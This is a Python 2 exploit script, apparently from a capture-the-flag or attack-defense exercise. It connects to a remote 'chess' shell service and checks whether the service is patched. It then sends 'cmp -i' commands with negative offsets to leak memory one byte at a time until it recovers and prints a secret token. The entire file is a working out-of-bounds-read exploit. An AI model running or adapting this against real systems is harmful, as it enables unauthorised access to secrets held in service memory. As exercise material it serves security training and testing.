import sys
import socket
import os
import struct
import random

def readuntil( s, u ):
    z = ''

    while z.endswith( u ) == False:
        z += s.recv(1)

    return z

def readline( s ):
    return readuntil( s, '\n')

def eatprompt(s):
    return readuntil( s, 'chess$ ')

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)

    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    eatprompt(s)

    ### init a larger file
    s.send('echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" >> fb\n')
    eatprompt(s)
    s.send('echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" >> fa\n')
    eatprompt(s)

    z = ''
    i = -1

    cmd = 'cmp -i {0} -b fa fb'.format( random.randint(-1000, -500) )

    print '[INFO] Checking if patched with: %s' %(cmd)
    s.send(cmd + '\n')
    y = eatprompt(s)

    if y.find('byte 0') == -1:
        print '[FAIL] Likely patched'
        s.send('exit\n')
        s.close()
        sys.exit(0)

    print '[INFO] Beginning the search'

    while z.startswith('token: ') == False:
        s.send( 'cmp -i %d -b fa fb\n' %i)
        result = eatprompt(s)

        if result.find('byte 0') == -1:
            z = 'a' + z
        else:
            a = result.split(' ')
            byte = a[7][-2:]

            try:
                z = chr( int(byte, 16) ) + z
            except:
                print '[ERROR] Some conversion error: %s' %(byte)
                s.send('exit\n')
                s.close()
                sys.exit(0)

        if len(z) > 128:
            z = z[:48]

        i = i - 1

    print 'TOKEN: %s' %z[7:39]

    s.send('exit\n')
    s.close()
    sys.exit(0)

if __name__ == '__main__':
    main(sys.argv)
